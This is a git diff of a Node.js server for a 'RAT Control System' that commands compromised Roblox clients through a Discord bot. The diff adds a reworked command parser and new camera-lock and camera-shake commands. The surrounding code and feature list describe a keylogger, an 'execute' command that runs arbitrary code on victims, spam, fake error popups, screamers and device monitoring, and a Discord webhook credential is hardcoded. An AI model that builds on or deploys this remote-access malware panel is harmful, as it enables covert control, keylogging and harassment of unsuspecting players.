@@ -9,7 +9,7 @@ const WEBHOOK_URL = "https://discord.com/api/webhooks/1441710251907874827/efwNq3
 const PORT = process.env.PORT || 10000;
 
 // Логирование конфигурации
-console.log('🔧 Конфигурация сервера v3.0:');
+console.log('🔧 Конфигурация сервера v3.1:');
 console.log(`- PORT: ${PORT}`);
 console.log(`- SERVER_URL: ${SERVER_URL}`);
 console.log(`- DISCORD_TOKEN: ${DISCORD_TOKEN ? '✅ Установлен' : '❌ Отсутствует'}`);
@@ -19,6 +19,92 @@ console.log(`- WEBHOOK_URL: ${WEBHOOK_URL ? '✅ Установлен' : '❌ О
 let commandQueue = [];
 let lastScreenshot = null;
 global.onlineUsers = new Map();
+
+// ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
+function isValidUsername(str) {
+    if (!str || typeof str !== 'string') return false;
+    if (str.length < 3 || str.length > 20) return false;
+    if (!/^[a-zA-Z0-9_]+$/.test(str)) return false;
+    if (!isNaN(parseInt(str))) return false; // не число
+    if (str.startsWith('-')) return false; // не параметр
+    return true;
+}
+
+function parseCommandWithTarget(message) {
+    const args = message.content.slice(1).split(' ');
+    const command = args.shift().toLowerCase();
+    
+    // Если нет аргументов
+    if (args.length === 0) {
+        return { command, args, target: null };
+    }
+    
+    // Список команд, которые НЕ принимают таргет как первый аргумент
+    const noTargetCommands = ['users', 'status', 'help', 'test', 'print'];
+    
+    // Список команд, где первый аргумент ВСЕГДА текст, а не ник
+    const textFirstCommands = ['message', 'fakeerror', 'execute', 'popup'];
+    
+    // Команды где первый аргумент может быть текстом (причина и тд)
+    const textPossibleCommands = ['kick'];
+    
+    // Команды где первый аргумент может быть текстом или числом
+    const mixedFirstArgCommands = ['cameralock', 'freeze', 'blur', 'playaudio', 'jumpscare', 'camerashake'];
+    
+    // Если команда в списке noTargetCommands
+    if (noTargetCommands.includes(command)) {
+        return { command, args, target: null };
+    }
+    
+    // Если команда требует текст первым аргументом
+    if (textFirstCommands.includes(command)) {
+        return { command, args, target: null };
+    }
+    
+    // Для команд где текст возможен, но не обязателен
+    if (textPossibleCommands.includes(command)) {
+        // Если есть больше одного аргумента, первый может быть ником
+        if (args.length > 1 && isValidUsername(args[0])) {
+            const target = args.shift();
+            return { command, args, target };
+        }
+        return { command, args, target: null };
+    }
+    
+    // Для команд со смешанными первыми аргументами
+    if (mixedFirstArgCommands.includes(command)) {
+        // Проверяем первый аргумент
+        const firstArg = args[0].toLowerCase();
+        
+        // Список допустимых текстовых значений для этих команд
+        const validTextValues = ['on', 'off', 'enable', 'disable', 'true', 'false'];
+        
+        // Если первый аргумент - валидный текст или число, то это не ник
+        if (validTextValues.includes(firstArg) || !isNaN(parseInt(firstArg))) {
+            return { command, args, target: null };
+        }
+        
+        // Если первый аргумент похож на ник
+        if (isValidUsername(args[0])) {
+            const target = args.shift();
+            return { command, args, target };
+        }
+        
+        return { command, args, target: null };
+    }
+    
+    // Для остальных команд проверяем первый аргумент
+    const firstArg = args[0];
+    
+    // Если первый аргумент похож на ник
+    if (isValidUsername(firstArg)) {
+        const target = args.shift();
+        return { command, args, target };
+    }
+    
+    // Во всех остальных случаях - нет таргета
+    return { command, args, target: null };
+}
 
 // ========== DISCORD БОТ ==========
 let discordClient = null;
@@ -87,32 +173,6 @@ if (DISCORD_TOKEN) {
         }
     }
 
-    // Функция для парсинга команды с таргетом
-    function parseCommandWithTarget(message) {
-        const args = message.content.slice(1).split(' ');
-        const command = args.shift().toLowerCase();
-        
-        // Список команд, которые НЕ принимают таргет как первый аргумент
-        const noTargetCommands = ['users', 'status', 'help', 'test', 'print'];
-        
-        if (noTargetCommands.includes(command) || args.length === 0) {
-            return { command, args, target: null };
-        }
-        
-        // Проверяем первый аргумент - если это число, то это не ник
-        const firstArg = args[0];
-        const isNumber = !isNaN(parseInt(firstArg));
-        const isSpecialArg = firstArg.match(/^[0-9]+$/) || firstArg.startsWith('-');
-        
-        if (!isNumber && !isSpecialArg) {
-            // Первый аргумент - вероятно ник
-            const target = args.shift();
-            return { command, args, target };
-        }
-        
-        return { command, args, target: null };
-    }
-
     // Функция для создания embed с учетом таргета
     function createEmbed(title, description, color, target = null) {
         const embed = new EmbedBuilder()
@@ -132,9 +192,9 @@ if (DISCORD_TOKEN) {
     discordClient.on('ready', () => {
         console.log(`🤖 Discord бот ${discordClient.user.tag} запущен!`);
         console.log(`🌐 Подключено к серверу: ${SERVER_URL}`);
-        console.log(`🎯 Версия: 3.0 (все команды + таргетинг)`);
+        console.log(`🎯 Версия: 3.1 (27 команд + исправленный парсер)`);
         
-        discordClient.user.setActivity('RAT Control Panel v3.0', { type: 'WATCHING' });
+        discordClient.user.setActivity('RAT Control Panel v3.1', { type: 'WATCHING' });
     });
 
     // ========== ВСЕ КОМАНДЫ ==========
@@ -370,6 +430,41 @@ if (DISCORD_TOKEN) {
                     }
                 },
                 
+                // 📷 НОВЫЕ КАМЕРНЫЕ КОМАНДЫ
+                cameralock: async () => {
+                    const action = args[0] || "toggle";
+                    const actionText = action === "on" ? "Включена" : 
+                                     action === "off" ? "Выключена" : "Переключена";
+                    
+                    if (await sendCommand("cameralock", [action], target)) {
+                        const embed = createEmbed(
+                            '🎥 Блокировка камеры',
+                            `**Действие:** ${actionText}\nКамера игрока будет заблокирована в текущей позиции`,
+                            0x3498db,
+                            target
+                        );
+                        await message.reply({ embeds: [embed] });
+                    }
+                },
+                
+                camerashake: async () => {
+                    let duration = parseInt(args[0]) || 5;
+                    let intensity = parseInt(args[1]) || 2;
+                    
+                    duration = Math.min(duration, 30);
+                    intensity = Math.min(intensity, 10);
+                    
+                    if (await sendCommand("camerashake", [duration, intensity], target)) {
+                        const embed = createEmbed(
+                            '📷 Тряска камеры',
+                            `**Длительность:** \`${duration}\` секунд\n**Интенсивность:** \`${intensity}\`\nКамера игрока будет трястись с указанной силой`,
+                            0xe67e22,
+                            target
+                        );
+                        await message.reply({ embeds: [embed] });
+                    }
+                },
+                
                 // ⚙️ СИСТЕМНЫЕ
                 execute: async () => {
                     const code = args.join(' ');
@@ -569,7 +664,7 @@ if (DISCORD_TOKEN) {
                                 { name: '🌐 Сервер', value: '🟢 Активен', inline: true },
                                 { name: '📨 Команды в очереди', value: `\`${data.pending_commands || 0}\``, inline: true },
                                 { name: '👥 Онлайн пользователей', value: `\`${data.online_users || 0}\``, inline: true },
-                                { name: '🛠️ Техническая информация', value: `• Версия: \`3.0.0\`\n• Сервер: \`${SERVER_URL}\`\n• Обновление: \`15 секунд\``, inline: false }
+                                { name: '🛠️ Техническая информация', value: `• Версия: \`3.1.0\`\n• Сервер: \`${SERVER_URL}\`\n• Команд: \`27\`\n• Обновление: \`15 секунд\``, inline: false }
                             )
                             .setTimestamp();
                         
@@ -582,13 +677,18 @@ if (DISCORD_TOKEN) {
                 // 📜 ПОМОЩЬ
                 help: async () => {
                     const helpEmbed = new EmbedBuilder()
-                        .setTitle('🤖 RAT Control Panel v3.0')
+                        .setTitle('🤖 RAT Control Panel v3.1')
                         .setDescription('Полный список всех команд с поддержкой таргетинга')
                         .setColor(0x7289da)
                         .addFields(
                             { 
                                 name: '🎯 Формат команд:', 
-                                value: '• `/команда` - для всех игроков\n• `/команда ник` - для конкретного игрока\n• `/команда ник аргументы` - с параметрами', 
+                                value: '• `/команда` - для всех игроков\n• `/команда ник` - для конкретного игрока\n• `/команда ник аргументы` - с параметрами\n\n**Примеры:**\n`/fakeerror текст` - для всех\n`/fakeerror PlayerName текст` - для игрока\n`/cameralock on` - для всех\n`/cameralock PlayerName off` - для игрока', 
+                                inline: false 
+                            },
+                            { 
+                                name: '📷 Камерные команды', 
+                                value: '`/cameralock [ник] <on/off>` - блокировка камеры\n`/camerashake [ник] <секунды> <интенсивность>` - тряска камеры', 
                                 inline: false 
                             },
                             { 
@@ -627,7 +727,7 @@ if (DISCORD_TOKEN) {
                                 inline: false 
                             }
                         )
-                        .setFooter({ text: `Всего команд: 25 | Сервер: ${SERVER_URL}` });
+                        .setFooter({ text: `Всего команд: 27 | Сервер: ${SERVER_URL} | Версия: 3.1.0` });
                     
                     await message.reply({ embeds: [helpEmbed] });
                 }
@@ -681,7 +781,7 @@ async function sendDiscordMessage(title, description, color = 0x3498db, fields =
                     color: color,
                     fields: fields,
                     timestamp: new Date().toISOString(),
-                    footer: { text: "RAT Control System v3.0" }
+                    footer: { text: "RAT Control System v3.1" }
                 }]
             })
         });
@@ -770,6 +870,28 @@ const server = http.createServer((req, res) => {
                         "🔌 Новый инжект!",
                         description,
                         0x00ff00
+                    );
+                }
+                
+                // Логирование новых камерных команд
+                if (command === "cameralock") {
+                    const action = args[0] || "toggle";
+                    const targetText = target || "всех игроков";
+                    await sendDiscordMessage(
+                        "🎥 Блокировка камеры",
+                        `**Цель:** ${targetText}\n**Действие:** ${action}`,
+                        0x3498db
+                    );
+                }
+                
+                if (command === "camerashake") {
+                    const duration = args[0] || 5;
+                    const intensity = args[1] || 2;
+                    const targetText = target || "всех игроков";
+                    await sendDiscordMessage(
+                        "📷 Тряска камеры",
+                        `**Цель:** ${targetText}\n**Длительность:** ${duration} сек\n**Интенсивность:** ${intensity}`,
+                        0xe67e22
                     );
                 }
                 
@@ -912,13 +1034,13 @@ const server = http.createServer((req, res) => {
         cleanupInactiveUsers();
         res.end(JSON.stringify({
             status: "online",
-            version: "3.0.0",
+            version: "3.1.0",
             online_users: global.onlineUsers.size,
             pending_commands: commandQueue.length,
             discord_bot: discordClient && discordClient.user ? {
                 username: discordClient.user.tag,
                 status: "online",
-                commands_count: 25,
+                commands_count: 27,
                 targeted_commands: true
             } : { status: "disabled" }
         }));
@@ -929,22 +1051,24 @@ const server = http.createServer((req, res) => {
     if (req.method === 'GET' && req.url === '/system_info') {
         res.end(JSON.stringify({
             name: "RAT Control System",
-            version: "3.0.0",
+            version: "3.1.0",
             description: "Продвинутая система удаленного управления Roblox клиентами",
             server: SERVER_URL,
             features: [
                 "Управление игроком (кик, заморозка, телепорт)",
                 "Скример система (Джефф Килер, Соник.exe)",
+                "Камерные команды (блокировка, тряска)",
                 "Чат система с сообщениями",
                 "Мониторинг устройств",
                 "Кейлоггер",
                 "Spam инструменты",
-                "Таргетированные команды"
+                "Таргетированные команды (исправленный парсер)"
             ],
+            total_commands: 27,
             discord_bot: discordClient && discordClient.user ? {
                 username: discordClient.user.tag,
                 status: "online",
-                commands_count: 25,
+                commands_count: 27,
                 targeted_commands: true
             } : { status: "disabled_no_token" }
         }));
@@ -954,14 +1078,15 @@ const server = http.createServer((req, res) => {
     // Корневой путь
     if (req.method === 'GET' && req.url === '/') {
         res.end(JSON.stringify({
-            message: "RAT Control System v3.0",
+            message: "RAT Control System v3.1",
             endpoints: [
                 "/data?player=NAME - Получение команд",
                 "/users - Онлайн пользователи",
                 "/status - Статус системы",
                 "/system_info - Информация о проекте"
             ],
-            documentation: "Используйте /help в Discord для управления"
+            documentation: "Используйте /help в Discord для управления",
+            new_features: "✅ Исправленный парсер команд | ✅ CameraLock | ✅ CameraShake"
         }));
         return;
     }
@@ -981,15 +1106,21 @@ server.listen(PORT, () => {
     console.log('• GET  /status - Статус сервера');
     console.log('• GET  /system_info - Информация о системе');
     console.log('');
+    console.log('🆕 НОВЫЕ ФУНКЦИИ v3.1:');
+    console.log('• ✅ Исправленный парсер команд (не путает текст с никами)');
+    console.log('• ✅ CameraLock - блокировка камеры игрока');
+    console.log('• ✅ CameraShake - тряска камеры с настройкой интенсивности');
+    console.log('');
     
     if (DISCORD_TOKEN) {
         console.log('💬 Discord команды готовы:');
-        console.log('• /help - Список всех команд (25 команд)');
+        console.log('• /help - Список всех команд (27 команд)');
         console.log('• /users - Онлайн пользователи');
-        console.log('• /jumpscare [ник] [тип] - Скримеры');
-        console.log('• /kick [ник] <причина> - Кикнуть');
-        console.log('• /freeze [ник] <секунды> - Заморозить');
+        console.log('• /cameralock [ник] <on/off> - Блокировка камеры');
+        console.log('• /camerashake [ник] <секунды> <интенсивность> - Тряска');
+        console.log('• /jumpscare [ник] <тип> - Скримеры');
         console.log('🎯 Формат: /команда [ник] [аргументы]');
+        console.log('⚠️  Теперь /fakeerror текст работает правильно!');
     } else {
         console.log('⚠️ Discord команды недоступны - установи DISCORD_TOKEN');
     }
